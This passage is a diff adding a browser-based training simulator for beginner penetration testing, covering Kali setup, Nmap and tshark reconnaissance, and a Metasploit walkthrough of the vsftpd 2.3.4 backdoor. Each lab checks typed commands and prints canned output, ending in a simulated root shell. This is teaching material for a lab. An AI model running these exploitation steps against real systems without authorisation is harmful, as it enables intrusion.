@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Beginner Pentest Labs · Setup, Nmap, Wireshark & Metasploit</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+:root{
+  --bg:#0a0e14; --bg-raised:#0f1419; --bg-card:#131920; --bg-terminal:#080c10;
+  --fg:#c5cdd8; --fg-bright:#e8edf3; --fg-dim:#5a6678;
+  --accent:#00ff9c; --accent-dim:rgba(0,255,156,.12); --accent-mid:rgba(0,255,156,.3);
+  --red:#ff3b5c; --red-dim:rgba(255,59,92,.12);
+  --orange:#ff9f43; --orange-dim:rgba(255,159,67,.12);
+  --cyan:#00d4ff; --cyan-dim:rgba(0,212,255,.12);
+  --yellow:#ffd93d; --yellow-dim:rgba(255,217,61,.12);
+  --purple:#a855f7; --purple-dim:rgba(168,85,247,.12);
+  --border:#1e2733; --border-light:#2a3544;
+  --radius:10px; --mono:'JetBrains Mono',monospace; --sans:'Inter',system-ui,sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:var(--sans);background:var(--bg);color:var(--fg);min-height:100vh;overflow-x:hidden}
+.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:linear-gradient(rgba(0,255,156,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,156,.025) 1px,transparent 1px);
+  background-size:60px 60px}
+.bg-glow{position:fixed;z-index:0;pointer-events:none;width:600px;height:600px;border-radius:50%;filter:blur(150px);opacity:.08}
+.bg-glow-1{top:-200px;right:-100px;background:var(--accent)}
+.bg-glow-2{bottom:-200px;left:-100px;background:var(--cyan)}
+.app{position:relative;z-index:1}
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 28px;
+  background:rgba(10,14,20,.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);
+  position:sticky;top:0;z-index:100}
+.topbar-left{display:flex;align-items:center;gap:12px}
+.logo{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--cyan));
+  display:flex;align-items:center;justify-content:center;font-size:1rem;color:#000;font-weight:800}
+.title{font-size:1rem;font-weight:700;color:var(--fg-bright)}
+.subtitle{font-size:.65rem;color:var(--fg-dim);font-weight:500;letter-spacing:1px;text-transform:uppercase}
+.topbar-right{display:flex;align-items:center;gap:10px}
+.stat-pill{display:flex;align-items:center;gap:6px;padding:6px 12px;border-radius:20px;font-size:.72rem;font-weight:600;
+  border:1px solid var(--border-light);background:var(--bg-card)}
+.stat-pill i{color:var(--accent)}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:calc(100vh - 65px)}
+.sidebar{background:var(--bg-raised);border-right:1px solid var(--border);padding:20px 0;
+  overflow-y:auto;max-height:calc(100vh - 65px);position:sticky;top:65px}
+.sidebar::-webkit-scrollbar{width:3px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
+.sidebar-section{margin-bottom:18px}
+.sidebar-label{font-size:.62rem;font-weight:700;color:var(--fg-dim);text-transform:uppercase;letter-spacing:1.5px;
+  padding:0 20px;margin-bottom:10px}
+.lab-item{display:flex;align-items:center;gap:12px;padding:10px 20px;cursor:pointer;
+  transition:.15s;border-left:3px solid transparent;position:relative}
+.lab-item:hover{background:rgba(255,255,255,.025)}
+.lab-item.active{background:var(--accent-dim);border-left-color:var(--accent)}
+.lab-item.done .lab-icon{background:var(--accent-dim);color:var(--accent);border-color:var(--accent-mid)}
+.lab-icon{width:30px;height:30px;border-radius:7px;flex-shrink:0;display:flex;align-items:center;justify-content:center;
+  font-size:.8rem;background:var(--bg-card);color:var(--fg-dim);border:1px solid var(--border-light);transition:.3s}
+.lab-item.active .lab-icon{background:var(--accent);color:#000;border-color:var(--accent)}
+.lab-info{flex:1;min-width:0}
+.lab-name{font-size:.8rem;font-weight:600;color:var(--fg-bright);line-height:1.2}
+.lab-item.active .lab-name{color:var(--accent)}
+.lab-cat{font-size:.65rem;color:var(--fg-dim);margin-top:2px}
+.content{padding:24px 28px;max-width:1400px}
+.lab-header{margin-bottom:24px}
+.lab-tag{display:inline-flex;align-items:center;gap:8px;font-size:.7rem;font-weight:700;color:var(--accent);
+  text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;font-family:var(--mono)}
+.lab-tag::before{content:'';width:24px;height:2px;background:var(--accent);border-radius:1px}
+.lab-header h1{font-size:1.8rem;font-weight:800;color:var(--fg-bright);line-height:1.2;margin-bottom:10px}
+.lab-header p{font-size:.9rem;color:var(--fg-dim);line-height:1.7;max-width:800px}
+.card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-bottom:18px}
+.card-head{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.card-icon{width:32px;height:32px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:.85rem}
+.card-icon.green{background:var(--accent-dim);color:var(--accent)}
+.card-icon.cyan{background:var(--cyan-dim);color:var(--cyan)}
+.card-icon.orange{background:var(--orange-dim);color:var(--orange)}
+.card-icon.red{background:var(--red-dim);color:var(--red)}
+.card-icon.yellow{background:var(--yellow-dim);color:var(--yellow)}
+.card-icon.purple{background:var(--purple-dim);color:var(--purple)}
+.card-title{font-size:.92rem;font-weight:700;color:var(--fg-bright)}
+.card-body{font-size:.84rem;color:var(--fg);line-height:1.7}
+.card-body ul{list-style:none;padding:0}
+.card-body ul li{padding:4px 0;padding-left:18px;position:relative}
+.card-body ul li::before{content:'?';position:absolute;left:0;color:var(--accent);font-weight:700}
+.lab-progress{display:flex;align-items:center;gap:12px;margin-bottom:18px;
+  background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px}
+.step-dots{display:flex;gap:6px;flex:1}
+.step-dot{height:6px;flex:1;border-radius:3px;background:var(--border-light);transition:.3s}
+.step-dot.active{background:var(--accent);box-shadow:0 0 8px var(--accent-mid)}
+.step-dot.done{background:var(--accent);opacity:.5}
+.step-text{font-size:.78rem;font-weight:600;color:var(--fg-dim);font-family:var(--mono);white-space:nowrap}
+.step-text span{color:var(--accent)}
+.scenario{background:linear-gradient(135deg,rgba(0,255,156,.08),rgba(0,212,255,.05));
+  border:1px solid rgba(0,255,156,.2);border-radius:var(--radius);padding:14px 18px;margin-bottom:18px;
+  display:flex;gap:12px;align-items:flex-start}
+.scenario i{color:var(--accent);font-size:1rem;padding-top:2px}
+.scenario-text{font-size:.82rem;color:var(--fg);line-height:1.6}
+.scenario-text strong{color:var(--cyan)}
+.terminal-wrap{margin-bottom:18px}
+.terminal-bar{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;
+  background:#0d1117;border:1px solid var(--border);border-bottom:none;border-radius:var(--radius) var(--radius) 0 0}
+.term-left{display:flex;align-items:center;gap:12px}
+.term-dots{display:flex;gap:6px}
+.term-dots span{width:11px;height:11px;border-radius:50%}
+.term-dots span:nth-child(1){background:#ff5f57}
+.term-dots span:nth-child(2){background:#febc2e}
+.term-dots span:nth-child(3){background:#28c840}
+.term-tab{font-size:.72rem;font-weight:600;color:var(--fg-dim);font-family:var(--mono);
+  padding:4px 11px;background:var(--bg-card);border-radius:5px;border:1px solid var(--border)}
+.term-actions{display:flex;gap:6px}
+.term-btn{padding:4px 10px;border-radius:5px;font-size:.68rem;font-weight:600;
+  border:1px solid var(--border-light);background:var(--bg-card);color:var(--fg-dim);cursor:pointer;
+  font-family:var(--mono);transition:.2s;display:flex;align-items:center;gap:5px}
+.term-btn:hover{border-color:var(--accent);color:var(--accent)}
+.terminal-body{background:var(--bg-terminal);border:1px solid var(--border);border-top:none;
+  border-radius:0 0 var(--radius) var(--radius);padding:16px;height:400px;overflow-y:auto;
+  font-family:var(--mono);font-size:.8rem;line-height:1.65}
+.terminal-body::-webkit-scrollbar{width:4px}
+.terminal-body::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
+.t-line{white-space:pre-wrap;word-break:break-all}
+.t-prompt{color:var(--accent)}
+.t-cmd{color:var(--fg-bright)}
+.t-output{color:var(--fg-dim)}
+.t-highlight{color:var(--cyan)}
+.t-warning{color:var(--orange)}
+.t-error{color:var(--red)}
+.t-success{color:var(--accent)}
+.t-info{color:var(--yellow)}
+.t-step{color:var(--purple);font-weight:600}
+.t-separator{color:var(--border-light)}
+.t-hint{color:var(--yellow);font-style:italic}
+.term-input-line{display:flex;align-items:center;gap:6px;margin-top:4px}
+.term-input-line .t-prompt{white-space:nowrap}
+.term-input{flex:1;background:transparent;border:none;outline:none;color:var(--fg-bright);
+  font-family:var(--mono);font-size:.8rem;caret-color:var(--accent)}
+.hint-panel{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:14px 18px;margin-bottom:18px;display:flex;align-items:flex-start;gap:12px}
+.hint-icon{width:32px;height:32px;border-radius:7px;flex-shrink:0;background:var(--yellow-dim);color:var(--yellow);
+  display:flex;align-items:center;justify-content:center;font-size:.85rem}
+.hint-content{flex:1}
+.hint-label{font-size:.7rem;font-weight:700;color:var(--yellow);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
+.hint-text{font-size:.84rem;color:var(--fg);line-height:1.6}
+.hint-text code{background:var(--bg);padding:2px 6px;border-radius:3px;color:var(--accent);font-family:var(--mono)}
+.complete-banner{display:none;align-items:center;gap:12px;padding:16px 20px;border-radius:var(--radius);
+  background:var(--accent-dim);border:1px solid var(--accent-mid);margin-bottom:18px}
+.complete-banner.show{display:flex}
+.complete-banner i{color:var(--accent);font-size:1.2rem}
+.complete-banner span{color:var(--accent);font-weight:600;font-size:.88rem}
+.btn{padding:11px 22px;border-radius:var(--radius);font-size:.85rem;font-weight:700;cursor:pointer;
+  border:1px solid var(--border-light);background:var(--bg-card);color:var(--fg);font-family:var(--sans);
+  transition:.2s;display:inline-flex;align-items:center;gap:8px}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.primary{background:linear-gradient(135deg,var(--accent),#00d4aa);color:#000;border:none;
+  box-shadow:0 4px 20px rgba(0,255,156,.2)}
+.btn.primary:hover{transform:translateY(-2px);box-shadow:0 6px 30px rgba(0,255,156,.3)}
+.btn:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none}
+@media(max-width:1024px){
+  .layout{grid-template-columns:1fr}
+  .sidebar{position:relative;top:0;max-height:none;display:flex;overflow-x:auto;padding:12px;gap:4px;
+    border-right:none;border-bottom:1px solid var(--border)}
+  .sidebar-section{margin-bottom:0;flex:1}
+  .sidebar-label{display:none}
+  .lab-item{padding:8px 12px;white-space:nowrap;border-left:none;border-bottom:2px solid transparent;flex-shrink:0}
+  .lab-item.active{border-bottom-color:var(--accent);border-left:none}
+  .lab-cat{display:none}
+}
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="bg-glow bg-glow-1"></div>
+<div class="bg-glow bg-glow-2"></div>
+<div class="app">
+  <header class="topbar">
+    <div class="topbar-left">
+      <div class="logo"><i class="fas fa-terminal"></i></div>
+      <div>
+        <div class="title">Beginner Pentest Labs</div>
+        <div class="subtitle">Setup, Nmap, Wireshark & Metasploit</div>
+      </div>
+    </div>
+    <div class="topbar-right">
+      <div class="stat-pill"><i class="fas fa-check-circle"></i> <span id="completedCount">0</span> / <span id="totalCount">0</span> Labs</div>
+      <button class="btn" onclick="resetCurrent()"><i class="fas fa-rotate-left"></i> Reset Lab</button>
+    </div>
+  </header>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar"></aside>
+    <main class="content" id="content"></main>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// LAB DEFINITIONS — Beginner Setup, Scanning, & Exploitation
+// ============================================================
+const LABS = [
+  {
+    id:'setup', name:'Lab Setup (EVE-NG & Kali)', category:'Environment Setup', icon:'fa-server', color:'cyan',
+    description:'Verify your Kali Linux VM is connected to the EVE-NG network and can reach the target.',
+    scenario:'You have booted up Kali Linux inside EVE-NG. Before hacking, you must verify network connectivity to the target machine (192.168.1.10).',
+    objectives:['Check your Kali IP address','Verify connectivity to the target using ping'],
+    steps:[
+      {instruction:'Check your Kali Linux IP address.',
+       hint:'Type <code>ip addr</code> to view your interfaces.',
+       validate:c=>/^ip\s+addr$/i.test(c.trim()),
+       output:'1: lo: <LOOPBACK,UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 192.168.1.5/24 brd 192.168.1.255 scope global dynamic eth0',
+       success:'Kali IP identified: 192.168.1.5'},
+      {instruction:'Ping the target machine to ensure you can reach it.',
+       hint:'Type <code>ping -c 4 192.168.1.10</code> (-c 4 sends exactly 4 packets).',
+       validate:c=>/^ping\s+-c\s+4\s+192\.168\.1\.10$/i.test(c.trim()),
+       output:'PING 192.168.1.10 (192.168.1.10) 56(84) bytes of data.\n64 bytes from 192.168.1.10: icmp_seq=1 ttl=64 time=1.23 ms\n64 bytes from 192.168.1.10: icmp_seq=2 ttl=64 time=1.15 ms\n64 bytes from 192.168.1.10: icmp_seq=3 ttl=64 time=1.18 ms\n64 bytes from 192.168.1.10: icmp_seq=4 ttl=64 time=1.20 ms\n\n--- 192.168.1.10 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss',
+       success:'Target is alive! Network connectivity verified.'}
+    ]
+  },
+  {
+    id:'nmap', name:'Nmap Port Scanning', category:'Reconnaissance', icon:'fa-radar', color:'orange',
+    description:'Use Nmap to discover open ports and services running on the target machine.',
+    scenario:'Now that you know the target is alive, you need to map its attack surface. Use Nmap to perform a service version scan.',
+    objectives:['Perform a basic host discovery scan','Run a service version detection scan on open ports'],
+    steps:[
+      {instruction:'Run a simple ping scan to see if the host is up (Nmap style).',
+       hint:'Type <code>nmap -sn 192.168.1.10</code>',
+       validate:c=>/^nmap\s+-sn\s+192\.168\.1\.10$/i.test(c.trim()),
+       output:'Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.10\nHost is up (0.0012s latency).\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds',
+       success:'Host is confirmed up via Nmap.'},
+      {instruction:'Run a service version detection scan on the target.',
+       hint:'Type <code>nmap -sV 192.168.1.10</code> (-sV probes open ports for version info).',
+       validate:c=>/^nmap\s+-sV\s+192\.168\.1\.10$/i.test(c.trim()),
+       output:'Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.10\nHost is up (0.0012s latency).\nNot shown: 996 closed tcp ports\n\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n22/tcp   open  ssh         OpenSSH 7.2p2\n80/tcp   open  http        Apache httpd 2.4.18\n445/tcp  open  netbios-ssn Samba smbd 4.3.11\n\nNmap done: 1 IP address (1 host up) scanned in 6.23 seconds',
+       success:'Discovered vsftpd 2.3.4, OpenSSH, Apache, and Samba.'}
+    ]
+  },
+  {
+    id:'wireshark', name:'Wireshark Traffic Analysis', category:'Traffic Analysis', icon:'fa-magnifying-glass-chart', color:'purple',
+    description:'Use tshark (Wireshark CLI) to capture traffic and verify the Nmap scan packets.',
+    scenario:'You want to see exactly what Nmap sent to the target. You will use tshark to capture network traffic in the background.',
+    objectives:['Start a tshark capture on eth0','Filter the capture to see only ARP traffic'],
+    steps:[
+      {instruction:'Start capturing traffic on the eth0 interface.',
+       hint:'Type <code>tshark -i eth0</code>',
+       validate:c=>/^tshark\s+-i\s+eth0$/i.test(c.trim()),
+       output:'Capturing on \'eth0\'\n1   0.000000  192.168.1.5 ? 192.168.1.10  TCP 74 51842 ? 21 [SYN] Seq=0 Win=64240 Len=0\n2   0.001245  192.168.1.10 ? 192.168.1.5  TCP 66 21 ? 51842 [SYN, ACK] Seq=0 Ack=1 Win=29200 Len=0\n3   0.001300  192.168.1.5 ? 192.168.1.10  TCP 54 51842 ? 21 [ACK] Seq=1 Ack=1 Win=64240 Len=0',
+       success:'Capture started, packets are flowing.'},
+      {instruction:'Apply a display filter to only show ARP packets.',
+       hint:'Type <code>arp</code> as the display filter.',
+       validate:c=>/^arp$/i.test(c.trim()),
+       output:'Applying display filter: arp\n\n4   0.002000  192.168.1.5 ? 192.168.1.1   ARP 42 Who has 192.168.1.1? Tell 192.168.1.5\n5   0.002124  192.168.1.1 ? 192.168.1.5   ARP 42 192.168.1.1 is at 00:1a:2b:3c:4d:5e',
+       success:'ARP filter applied successfully.'}
+    ]
+  },
+  {
+    id:'msfconsole', name:'Metasploit Basics', category:'Exploitation', icon:'fa-skull', color:'red',
+    description:'Launch the Metasploit Framework and search for a known exploit.',
+    scenario:'During your Nmap scan, you found vsftpd 2.3.4 running on port 21. This version has a famous backdoor exploit. Start Metasploit!',
+    objectives:['Start the Metasploit console','Search for the vsftpd exploit'],
+    steps:[
+      {instruction:'Launch the Metasploit Framework Console.',
+       hint:'Type <code>msfconsole</code>',
+       validate:c=>/^msfconsole$/i.test(c.trim()),
+       output:'       =[ metasploit v6.3.36-dev                          ]\n+ -- --=[ 2389 exploits - 1235 auxiliary - 413 post           ]\n+ -- --=[ 1371 payloads - 45 encoders - 11 nops               ]\n\nMetasploit tip: Use the resource command to run commands from a file\n\nmsf6 >',
+       success:'Metasploit launched successfully.'},
+      {instruction:'Search for exploits related to vsftpd.',
+       hint:'Type <code>search vsftpd</code>',
+       validate:c=>/^search\s+vsftpd$/i.test(c.trim()),
+       output:'Matching Modules\n=================\n\n   #  Name                                  Disclosure Date  Rank    Description\n   -  ----                                  ---------------  ----    -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       great   VSFTPD v2.3.4 Backdoor Command Execution\n\nmsf6 >',
+       success:'Found the vsftpd_234_backdoor exploit!'}
+    ]
+  },
+  {
+    id:'exploit', name:'Exploiting vsftpd Backdoor', category:'Exploitation', icon:'fa-bolt', color:'yellow',
+    description:'Select the exploit, configure the target IP, and execute it to get a shell.',
+    scenario:'You found the exploit. Now you must select it, point it at your target (192.168.1.10), and launch the attack.',
+    objectives:['Select the vsftpd exploit module','Set the RHOSTS (target IP)','Execute the exploit'],
+    steps:[
+      {instruction:'Select the vsftpd backdoor exploit module.',
+       hint:'Type <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>',
+       validate:c=>/^use\s+exploit\/unix\/ftp\/vsftpd_234_backdoor$/i.test(c.trim()),
+       output:'[*] No active DB -- Credential saved in configuration.\n[*] Using exploit/unix/ftp/vsftpd_234_backdoor\n\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) >',
+       success:'Exploit module selected.'},
+      {instruction:'Configure the target IP address (RHOSTS).',
+       hint:'Type <code>set RHOSTS 192.168.1.10</code>',
+       validate:c=>/^set\s+RHOSTS\s+192\.168\.1\.10$/i.test(c.trim()),
+       output:'RHOSTS => 192.168.1.10',
+       success:'Target IP configured.'},
+      {instruction:'Execute the exploit to compromise the target.',
+       hint:'Type <code>exploit</code> or <code>run</code>',
+       validate:c=>/^(exploit|run)$/i.test(c.trim()),
+       output:'[*] 192.168.1.10:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 192.168.1.10:21 - USER: 331 Please specify the password.\n[+] 192.168.1.10:21 - Backdoor service has been spawned\n[+] 192.168.1.10:21 - UID: uid=0(root) gid=0(root)\n[*] Found shell.\n[*] Command shell session 1 opened (192.168.1.5:4441 -> 192.168.1.10:6200)\n\nid\nuid=0(root) gid=0(root)',
+       success:'Exploit successful! You got a root shell.'}
+    ]
+  }
+];
+
+// ============================================================
+// STATE & ENGINE
+// ============================================================
+let currentLab = 0;
+let currentStep = 0;
+let completedLabs = new Set();
+let commandHistory = [];
+let historyIdx = -1;
+
+// ============================================================
+// SIDEBAR RENDER (With requested Back button)
+// ============================================================
+function renderSidebar(){
+  const sb = document.getElementById('sidebar');
+  let html = `
+    <a href="paid-cybersecurity-course.html" style="display:flex; align-items:center; gap:8px; text-decoration:none; color:var(--cyan); padding:10px 20px; margin-bottom:15px; font-size:0.85rem; font-weight:700; border-bottom:1px solid var(--border);">
+      <i class="fas fa-arrow-left"></i> Back to Attack Labs
+    </a>
+    <div class="sidebar-section"><div class="sidebar-label">Beginner Pentest</div>
+  `;
+  LABS.forEach((lab,i)=>{
+    const done = completedLabs.has(i);
+    const active = i===currentLab;
+    html += `<div class="lab-item ${active?'active':''} ${done?'done':''}" onclick="selectLab(${i})">
+      <div class="lab-icon"><i class="fas ${lab.icon}"></i></div>
+      <div class="lab-info">
+        <div class="lab-name">${lab.name}</div>
+        <div class="lab-cat">${lab.category}</div>
+      </div>
+    </div>`;
+  });
+  html += '</div>';
+  sb.innerHTML = html;
+  document.getElementById('completedCount').textContent = completedLabs.size;
+  document.getElementById('totalCount').textContent = LABS.length;
+}
+
+// ============================================================
+// LAB RENDER
+// ============================================================
+function renderLab(){
+  const lab = LABS[currentLab];
+  const area = document.getElementById('content');
+  
+  let dotsHTML = '';
+  lab.steps.forEach((_,i)=>{
+    dotsHTML += `<div class="step-dot ${i===currentStep?'active':''} ${i<currentStep?'done':''}"></div>`;
+  });
+
+  const objHTML = lab.objectives.map(o=>`<li>${o}</li>`).join('');
+  const isComplete = currentStep >= lab.steps.length;
+
+  area.innerHTML = `
+    <div class="lab-header">
+      <div class="lab-tag"><i class="fas ${lab.icon}"></i> Lab ${currentLab+1} of ${LABS.length} · ${lab.category}</div>
+      <h1>${lab.name}</h1>
+      <p>${lab.description}</p>
+    </div>
+
+    <div class="scenario">
+      <i class="fas fa-triangle-exclamation"></i>
+      <div class="scenario-text"><strong>Scenario:</strong> ${lab.scenario}</div>
+    </div>
+
+    <div class="complete-banner ${isComplete?'show':''}" id="completeBanner">
+      <i class="fas fa-circle-check"></i>
+      <span>Lab completed — all objectives achieved. Move to the next lab when ready.</span>
+    </div>
+
+    <div class="lab-progress">
+      <div class="step-dots">${dotsHTML}</div>
+      <div class="step-text">Step <span>${Math.min(currentStep+1, lab.steps.length)}</span> / ${lab.steps.length}</div>
+    </div>
+
+    <div class="card">
+      <div class="card-head">
+        <div class="card-icon green"><i class="fas fa-bullseye"></i></div>
+        <div class="card-title">Objectives</div>
+      </div>
+      <div class="card-body"><ul>${objHTML}</ul></div>
+    </div>
+
+    <div class="terminal-wrap">
+      <div class="terminal-bar">
+        <div class="term-left">
+          <div class="term-dots"><span></span><span></span><span></span></div>
+          <div class="term-tab">root@kali: ~/${lab.id}</div>
+        </div>
+        <div class="term-actions">
+          <button class="term-btn" onclick="clearTerminal()"><i class="fas fa-eraser"></i> Clear</button>
+          <button class="term-btn" onclick="showSolution()"><i class="fas fa-lightbulb"></i> Solution</button>
+        </div>
+      </div>
+      <div class="terminal-body" id="terminalBody">
+        <div class="t-line t-output"># ${lab.name} — Interactive CLI Lab</div>
+        <div class="t-line t-output"># Type the appropriate command for each step, then press Enter.</div>
+        <div class="t-line t-output"># Use the up/down arrow keys to browse command history.</div>
+        <div class="t-line t-separator">${'-'.repeat(60)}</div>
+        ${currentStep < lab.steps.length ? `
+        <div class="t-line t-step">>> Step ${currentStep+1}: ${lab.steps[currentStep].instruction}</div>
+        ` : `<div class="t-success">>> Lab complete! All steps executed.</div>`}
+      </div>
+    </div>
+
+    ${currentStep < lab.steps.length ? `
+    <div class="hint-panel">
+      <div class="hint-icon"><i class="fas fa-lightbulb"></i></div>
+      <div class="hint-content">
+        <div class="hint-label">Hint for current step</div>
+        <div class="hint-text">${lab.steps[currentStep].hint}</div>
+      </div>
+    </div>` : ''}
+
+    <div style="display:flex; gap:12px; flex-wrap:wrap; margin-bottom:24px;">
+      ${currentStep >= lab.steps.length ? `
+        <button class="btn primary" onclick="nextLab()"><i class="fas fa-arrow-right"></i> Next Lab</button>
+        <button class="btn" onclick="resetCurrent()"><i class="fas fa-rotate-left"></i> Retry Lab</button>
+      ` : `
+        <button class="btn" onclick="showSolution()"><i class="fas fa-eye"></i> Reveal Solution</button>
+        <button class="btn" onclick="resetCurrent()"><i class="fas fa-rotate-left"></i> Reset Lab</button>
+      `}
+    </div>
+  `;
+
+  if (currentStep < lab.steps.length) {
+    const tb = document.getElementById('terminalBody');
+    const inputLine = document.createElement('div');
+    inputLine.className = 'term-input-line';
+    inputLine.innerHTML = `<span class="t-prompt">root@kali</span><span class="t-output">:</span><span class="t-highlight">~/${lab.id}</span><span class="t-output">$ </span><input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false">`;
+    tb.appendChild(inputLine);
+    setTimeout(()=>{ const inp = document.getElementById('termInput'); if(inp){ inp.focus(); bindInput(inp); } },50);
+  }
+}
+
+// ============================================================
+// INPUT HANDLING
+// ============================================================
+function bindInput(input){
+  input.addEventListener('keydown', e=>{
+    if(e.key === 'Enter'){
+      const cmd = input.value;
+      executeCommand(cmd);
+    } else if(e.key === 'ArrowUp'){
+      e.preventDefault();
+      if(historyIdx > 0){ historyIdx--; input.value = commandHistory[historyIdx]; }
+    } else if(e.key === 'ArrowDown'){
+      e.preventDefault();
+      if(historyIdx < commandHistory.length - 1){ historyIdx++; input.value = commandHistory[historyIdx]; }
+      else { historyIdx = commandHistory.length; input.value = ''; }
+    } else if(e.key === 'Tab'){
+      e.preventDefault();
+      const partial = input.value;
+      const suggestions = ['ip addr','ping -c 4 192.168.1.10','nmap -sn 192.168.1.10','nmap -sV 192.168.1.10','tshark -i eth0','arp','msfconsole','search vsftpd','use exploit/unix/ftp/vsftpd_234_backdoor','set RHOSTS 192.168.1.10','exploit'];
+      const match = suggestions.find(s=>s.startsWith(partial) && s !== partial);
+      if(match) input.value = match;
+    }
+  });
+}
+
+function executeCommand(cmd){
+  if(!cmd.trim()) return;
+  const lab = LABS[currentLab];
+  const step = lab.steps[currentStep];
+  const tb = document.getElementById('terminalBody');
+
+  commandHistory.push(cmd);
+  historyIdx = commandHistory.length;
+
+  const echoLine = document.createElement('div');
+  echoLine.className = 't-line';
+  echoLine.innerHTML = `<span class="t-prompt">root@kali</span><span class="t-output">:</span><span class="t-highlight">~/${lab.id}</span><span class="t-output">$ </span><span class="t-cmd">${escapeHtml(cmd)}</span>`;
+  tb.insertBefore(echoLine, document.querySelector('.term-input-line'));
+
+  if(step.validate(cmd)){
+    typeOutput(step.output, ()=>{
+      const succLine = document.createElement('div');
+      succLine.className = 't-line t-success';
+      succLine.textContent = '[+] ' + step.success;
+      tb.insertBefore(succLine, document.querySelector('.term-input-line'));
+      
+      const sepLine = document.createElement('div');
+      sepLine.className = 't-line t-separator';
+      sepLine.textContent = '-'.repeat(60);
+      tb.insertBefore(sepLine, document.querySelector('.term-input-line'));
+      
+      currentStep++;
+      
+      document.querySelectorAll('.step-dot').forEach((d,i)=>{
+        d.classList.remove('active');
+        if(i < currentStep) d.classList.add('done');
+        if(i === currentStep) d.classList.add('active');
+      });
+      
+      if(currentStep >= lab.steps.length){
+        completedLabs.add(currentLab);
+        renderSidebar();
+        const finalLine = document.createElement('div');
+        finalLine.className = 't-line t-success';
+        finalLine.innerHTML = '\n[!!!] LAB COMPLETE — All objectives achieved!\n[!!!] Use the "Next Lab" button below to continue.';
+        tb.insertBefore(finalLine, document.querySelector('.term-input-line'));
+        document.querySelector('.term-input-line').remove();
+        document.getElementById('completeBanner').classList.add('show');
+        renderLab();
+      } else {
+        const nextStepLine = document.createElement('div');
+        nextStepLine.className = 't-line t-step';
+        nextStepLine.textContent = `>> Step ${currentStep+1}: ${lab.steps[currentStep].instruction}`;
+        tb.insertBefore(nextStepLine, document.querySelector('.term-input-line'));
+        document.querySelector('.hint-text').innerHTML = lab.steps[currentStep].hint;
+        document.querySelector('.step-text').innerHTML = `Step <span>${currentStep+1}</span> / ${lab.steps.length}`;
+        const inp = document.getElementById('termInput');
+        if(inp){ inp.value = ''; inp.focus(); }
+      }
+      tb.scrollTop = tb.scrollHeight;
+    });
+  } else {
+    const errLine = document.createElement('div');
+    errLine.className = 't-line t-error';
+    errLine.textContent = '[-] Invalid command or syntax error. Check the hint and try again.';
+    tb.insertBefore(errLine, document.querySelector('.term-input-line'));
+    
+    const hintLine = document.createElement('div');
+    hintLine.className = 't-line t-hint';
+    hintLine.innerHTML = '[?] Hint: ' + step.hint;
+    tb.insertBefore(hintLine, document.querySelector('.term-input-line'));
+    
+    const inp = document.getElementById('termInput');
+    if(inp){ inp.value = ''; inp.focus(); }
+    tb.scrollTop = tb.scrollHeight;
+  }
+}
+
+function typeOutput(text, cb){
+  const tb = document.getElementById('terminalBody');
+  const lines = text.split('\n');
+  let lineIdx = 0;
+  
+  function nextLine(){
+    if(lineIdx >= lines.length){
+      setTimeout(cb, 100);
+      return;
+    }
+    const div = document.createElement('div');
+    div.className = 't-line t-output';
+    div.textContent = lines[lineIdx];
+    tb.insertBefore(div, document.querySelector('.term-input-line'));
+    tb.scrollTop = tb.scrollHeight;
+    lineIdx++;
+    setTimeout(nextLine, 25 + Math.random()*20);
+  }
+  nextLine();
+}
+
+function escapeHtml(s){
+  return s.replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+}
+
+function clearTerminal(){
+  const tb = document.getElementById('terminalBody');
+  const lab = LABS[currentLab];
+  tb.innerHTML = `<div class="t-line t-output"># Terminal cleared</div>
+    <div class="t-line t-separator">${'-'.repeat(60)}</div>
+    <div class="t-line t-step">>> Step ${currentStep+1}: ${lab.steps[currentStep].instruction}</div>`;
+  const inputLine = document.createElement('div');
+  inputLine.className = 'term-input-line';
